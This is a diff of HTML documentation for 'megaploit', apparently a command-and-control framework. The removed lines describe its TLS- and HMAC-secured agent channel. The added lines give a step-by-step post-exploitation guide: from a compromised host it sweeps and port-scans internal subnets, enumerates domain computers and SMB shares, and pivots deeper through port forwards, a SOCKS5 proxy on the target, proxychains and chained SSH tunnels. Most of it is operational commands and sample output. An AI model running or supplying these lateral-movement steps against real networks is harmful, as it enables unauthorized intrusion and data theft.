-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_handshake</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<p>More comprehensive than ARP cache — sends ARP requests to the whole subnet.
+Falls back to: scapy → arp-scan → nmap → ping sweep (Windows).</p>
+<h3 id="icmp-ping-sweep">ICMP Ping Sweep<a class="headerlink" href="#icmp-ping-sweep" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>megaploit session(1) » ping_sweep 192.168.10.0/24
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>[+] 192.168.10.1 is alive
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>[+] 192.168.10.5 is alive
 </span></code></pre></div>
-<p><strong>Relevant config constants</strong> (<a href="../megaploit/core/config.py"><code>core/config.py</code></a>):</p>
-<table>
-<thead>
-<tr>
-<th>Constant</th>
-<th>Default</th>
-<th>Meaning</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>AUTH_TIMEOUT</code></td>
-<td>10 s</td>
-<td>Socket deadline during HMAC auth; prevents connection-hold attacks</td>
-</tr>
-<tr>
-<td><code>BUFFER_SIZE</code></td>
-<td>65536</td>
-<td>General socket read buffer — 64 KiB covers the largest post-handshake C2 frame without thrashing the kernel</td>
-</tr>
-<tr>
-<td><code>MAX_PLUGIN_MSG_SIZE</code></td>
-<td>268,435,456 (256 MiB)</td>
-<td>Hard cap enforced by <code>_recv_framed</code>; prevents memory exhaustion from malformed or hostile peers; sized for large plugin output, screenshots, and zip transfers</td>
-</tr>
-<tr>
-<td><code>RECONNECT_DELAY</code></td>
-<td>10 s</td>
-<td>Agent base reconnect interval</td>
-</tr>
-<tr>
-<td><code>RECONNECT_JITTER</code></td>
-<td>5 s</td>
-<td>Max random jitter added to reconnect delay</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="3-layer-1-tls-optional">3. Layer 1 — TLS (optional)<a class="headerlink" href="#3-layer-1-tls-optional" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/server/listener.py"><code>megaploit/server/listener.py:267</code></a> — <code>build_ssl_context()</code> / <code>build_agent_ssl_context()</code> / <code>generate_self_signed_cert()</code></p>
-<p>When TLS is enabled, the raw socket is wrapped with a hardened TLS context <strong>before</strong> any authentication bytes are exchanged:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">ssl_context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">raw_conn</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<h3 id="tcp-port-scan-from-target-reaches-internal-network">TCP Port Scan (from target, reaches internal network)<a class="headerlink" href="#tcp-port-scan-from-target-reaches-internal-network" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>megaploit session(1) » port_scan 192.168.10.20 22,80,443,3389,8080
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>[+] 22    ssh      open
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>[+] 80    http     open
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>[+] 3389  rdp      open
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>megaploit session(1) » port_scan 192.168.10.20 1-1024
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>megaploit session(1) » port_scan 192.168.10.20 8080-8090
 </span></code></pre></div>
-<p><strong>Hardening configuration applied:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Option</th>
-<th>Value</th>
-<th>Effect</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Minimum protocol</td>
-<td>TLS 1.2</td>
-<td>Excludes SSLv2, SSLv3, TLS 1.0, TLS 1.1</td>
-</tr>
-<tr>
-<td>Cipher suites</td>
-<td><code>ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20</code></td>
-<td>AEAD-only; no CBC, no RC4, no export</td>
-</tr>
-<tr>
-<td><code>OP_NO_COMPRESSION</code></td>
-<td>set</td>
-<td>CRIME attack mitigation</td>
-</tr>
-<tr>
-<td><code>OP_CIPHER_SERVER_PREFERENCE</code></td>
-<td>set</td>
-<td>Server picks cipher, not client</td>
-</tr>
-<tr>
-<td><code>OP_SINGLE_DH_USE</code> + <code>OP_SINGLE_ECDH_USE</code></td>
-<td>set</td>
-<td>Fresh DH parameters per session (forward secrecy)</td>
-</tr>
-<tr>
-<td><code>OP_NO_RENEGOTIATION</code></td>
-<td>set (Python ≥ 3.7)</td>
-<td>Prevents renegotiation-based attacks</td>
-</tr>
-</tbody>
-</table>
-<p>The agent-side context (<code>build_agent_ssl_context</code>) uses <code>CERT_NONE</code> + <code>check_hostname=False</code> because the server uses a self-signed certificate. TLS 1.2+ and AEAD-only ciphers are still enforced on the agent side.</p>
-<h3 id="auto-cert-recommended">Auto-cert (recommended)<a class="headerlink" href="#auto-cert-recommended" title="Permanent link">&para;</a></h3>
-<p>Megaploit can generate and manage the TLS certificate itself — no <code>openssl</code> command needed:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Startup flag — generates loot/tls/megaploit.crt + loot/tls/megaploit.key</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--tls
+<p>Uses 256 concurrent threads. Supports: single port, comma-separated list, ranges (<code>1-1024</code>).</p>
+<h3 id="domain-windows-network-enumeration">Domain / Windows Network Enumeration<a class="headerlink" href="#domain-windows-network-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>megaploit session(1) » net_view
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>megaploit session(1) » net_view CORPORATE.LOCAL
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a># Output: domain computers, domain controllers, shares
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a># Example output:
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>[+] Domain: CORPORATE.LOCAL
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>[+] DC: DC01.CORPORATE.LOCAL (192.168.10.5)
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>[+] Computers: WORKSTATION01, WORKSTATION02, FILESERVER01
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>[+] Shares on FILESERVER01: \\FILESERVER01\Finance, \\FILESERVER01\IT
+</span></code></pre></div>
+<h3 id="smb-share-enumeration">SMB Share Enumeration<a class="headerlink" href="#smb-share-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>megaploit session(1) » smb_shares FILESERVER01
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>megaploit session(1) » smb_shares 192.168.10.20
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Or from the console at any time:</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>tls<span class="w"> </span>auto<span class="w">     </span><span class="c1"># generate &amp; activate immediately</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>tls<span class="w"> </span>status<span class="w">   </span><span class="c1"># cert path + SHA-256 fingerprint</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>tls<span class="w"> </span>regen<span class="w">    </span><span class="c1"># force new cert</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a># Output:
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>[+] \\192.168.10.20\Finance  (READ)
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>[+] \\192.168.10.20\IT       (READ, WRITE)
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>[+] \\192.168.10.20\ADMIN$   (No access)
 </span></code></pre></div>
-<p>The auto-cert is RSA-2048, valid for 365 days, stored in <code>loot/tls/</code>. The SHA-256 fingerprint is printed in the startup config box and reused on subsequent runs. Uses the <code>cryptography</code> Python package if installed; falls back to <code>openssl req</code> subprocess.</p>
-<h3 id="manual-cert">Manual cert<a class="headerlink" href="#manual-cert" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-newkey<span class="w"> </span>rsa:4096<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-out<span class="w"> </span>cert.pem<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-nodes
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--cert<span class="w"> </span>cert.pem<span class="w"> </span>--key<span class="w"> </span>key.pem
+<h3 id="network-interfaces">Network Interfaces<a class="headerlink" href="#network-interfaces" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>megaploit session(1) » ifconfig
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>eth0: 192.168.10.50/24  (MAC: 00:0C:29:AB:CD:EF)
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>eth1: 10.10.0.50/16     (MAC: 00:0C:29:AB:CD:F0)  ← internal network!
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>lo:   127.0.0.1
+</span></code></pre></div>
+<p><strong>When you see multiple interfaces</strong> — the target is multi-homed and can reach another network.
+This is your pivot point.</p>
+<h3 id="routing-table">Routing Table<a class="headerlink" href="#routing-table" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>megaploit session(1) » routes
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Destination     Gateway         Interface
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>0.0.0.0         192.168.10.1    eth0
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>10.10.0.0/16    0.0.0.0         eth1
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>192.168.10.0/24 0.0.0.0         eth0
+</span></code></pre></div>
+<h3 id="active-connections">Active Connections<a class="headerlink" href="#active-connections" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>megaploit session(1) » netstat
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>PID    Proto  Local               Foreign             State
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>1234   TCP    192.168.10.50:80    0.0.0.0:0           LISTEN
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>5678   TCP    192.168.10.50:443   0.0.0.0:0           LISTEN
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>9012   TCP    192.168.10.50:52341 8.8.8.8:443         ESTABLISHED
+</span></code></pre></div>
+<h3 id="dns-lookup-from-targets-dns-server">DNS Lookup (from target's DNS server)<a class="headerlink" href="#dns-lookup-from-targets-dns-server" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>megaploit session(1) » dns_query internal-dc.corp
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>[+] internal-dc.corp → 10.10.0.5
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>megaploit session(1) » dns_query fileserver.local
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>[+] fileserver.local → 10.10.0.20
+</span></code></pre></div>
+<p>The target's DNS server may resolve internal hostnames your DNS can't reach.</p>
+<hr />
+<h2 id="pivoting">Pivoting<a class="headerlink" href="#pivoting" title="Permanent link">&para;</a></h2>
+<p>Pivoting means using a compromised host as a relay to reach hosts in networks you can't directly access.</p>
+<h3 id="method-1-port-forwarding-portfwd">Method 1 — Port Forwarding (<code>portfwd</code>)<a class="headerlink" href="#method-1-port-forwarding-portfwd" title="Permanent link">&para;</a></h3>
+<p>Forward a port from the target machine to an internal host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Format: portfwd &lt;listen_port_on_target&gt; &lt;destination_host&gt; &lt;destination_port&gt;
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>megaploit session(1) » portfwd 8888 10.10.0.20 3389
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>[+] Port forward active: target:8888 → 10.10.0.20:3389
+</span></code></pre></div>
+<p>Now connect to <code>target-ip:8888</code> as if it were <code>10.10.0.20:3389</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># RDP to internal host through the compromised machine:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>mstsc<span class="w"> </span>/v:192.168.10.50:8888
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># SSH to internal host:</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>megaploit<span class="w"> </span>session<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span>»<span class="w"> </span>portfwd<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="m">10</span>.10.0.50<span class="w"> </span><span class="m">22</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>ssh<span class="w"> </span>user@192.168.10.50<span class="w"> </span>-p<span class="w"> </span><span class="m">2222</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># Access internal web service:</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>megaploit<span class="w"> </span>session<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span>»<span class="w"> </span>portfwd<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">10</span>.10.0.100<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="c1"># Open http://192.168.10.50:8080 in your browser</span>
+</span></code></pre></div>
+<h3 id="method-2-socks5-proxy">Method 2 — SOCKS5 Proxy<a class="headerlink" href="#method-2-socks5-proxy" title="Permanent link">&para;</a></h3>
+<p>Start a SOCKS5 proxy on the target. Route <strong>all</strong> your tools through it.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>megaploit session(1) » socks5
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>[+] SOCKS5 proxy started on target:1080
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>megaploit session(1) » socks5 9050    # custom port
+</span></code></pre></div>
+<p><strong>Configure proxychains</strong> on your machine:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Edit /etc/proxychains.conf (or proxychains4.conf):</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>socks5<span class="w"> </span><span class="m">192</span>.168.10.50<span class="w"> </span><span class="m">1080</span>
+</span></code></pre></div>
+<p><strong>Now run any tool through the target:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Port scan internal host through the pivot:</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>proxychains<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,443,3389<span class="w"> </span><span class="m">10</span>.10.0.20
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># SSH to internal host:</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>proxychains<span class="w"> </span>ssh<span class="w"> </span>user@10.10.0.20
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># Access internal web app:</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>proxychains<span class="w"> </span>curl<span class="w"> </span>http://10.10.0.100/admin
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="c1"># Run metasploit through pivot:</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>proxychains<span class="w"> </span>msfconsole
+</span></code></pre></div>
+<h3 id="method-3-reverse-shell-to-pivot">Method 3 — Reverse Shell to Pivot<a class="headerlink" href="#method-3-reverse-shell-to-pivot" title="Permanent link">&para;</a></h3>
+<p>If you need a fully interactive shell on an internal host, chain reverse shells:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a># On the target (session 1), set up portfwd to reach internal host&#39;s SSH:
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>megaploit session(1) » portfwd 2222 10.10.0.20 22
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a># SSH to internal host from your machine:
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>ssh root@192.168.10.50 -p 2222
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a># Or: use SSH dynamic tunneling through portfwd:
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>ssh -D 1080 root@192.168.10.50 -p 2222
+</span></code></pre></div>
+<h3 id="method-4-pivot-routes-server-side-topology">Method 4 — Pivot Routes (Server-Side Topology)<a class="headerlink" href="#method-4-pivot-routes-server-side-topology" title="Permanent link">&para;</a></h3>
+<p>Document your pivot topology in the server so tools and post modules know how to route:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>megaploit [0] » route add 10.10.0.0/16 1      # reach 10.10.x.x through session 1
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>megaploit [0] » route add 172.16.0.0/12 2     # reach 172.16.x.x through session 2
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>megaploit [0] » route print
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>  CIDR              Session  Session IP
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>  10.10.0.0/16      1        192.168.10.50
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>  172.16.0.0/12     2        10.10.0.100
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>megaploit [0] » route remove 10.10.0.0/16
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>megaploit [0] » route flush
 </span></code></pre></div>
 <hr />
-<h2 id="4-layer-2-hmac-sha256-authentication">4. Layer 2 — HMAC-SHA256 authentication<a class="headerlink" href="#4-layer-2-hmac-sha256-authentication" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/crypto.py"><code>megaploit/core/crypto.py</code></a></p>
-<p>After TLS (or immediately on a plain TCP socket), both sides run a challenge/response exchange using the shared 32-byte secret key.</p>
-<p><strong>Wire sequence:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Server                              Agent
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  │                                    │
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>  │──── 16 random bytes (challenge) ──►│
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>  │                                    │  HMAC-SHA256(key, challenge)
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>  │◄─── 32 bytes (HMAC response) ──────│
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>  │  hmac.compare_digest()             │
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  │  drop if mismatch                  │
-</span></code></pre></div>
-<p><strong>Server code:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">challenge</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">challenge</span><span class="p">)</span>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">resp</span>     <span class="o">=</span> <span class="n">recv_exactly</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>          <span class="c1"># read exactly 32 bytes</span>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">expected</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">expected</span><span class="p">)</span> <span class="c1"># constant-time compare</span>
-</span></code></pre></div></p>
-<p><strong>Agent code:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">challenge</span> <span class="o">=</span> <span class="n">recv_exactly</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">response</span>  <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
